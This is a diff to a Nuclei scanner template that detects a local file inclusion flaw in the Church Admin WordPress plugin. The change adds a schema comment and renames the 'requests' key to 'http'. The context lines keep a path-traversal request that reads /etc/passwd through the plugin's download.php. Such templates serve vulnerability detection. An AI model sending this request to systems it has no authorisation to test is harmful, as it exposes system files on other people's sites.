@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: church-admin-lfi
 
 info:
@@ -10,7 +11,7 @@ info:
     - https://id.wordpress.org/plugins/church-admin/
   tags: wordpress,wp-plugin,lfi
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/wp-content/plugins/church-admin/display/download.php?key=../../../../../../../etc/passwd'
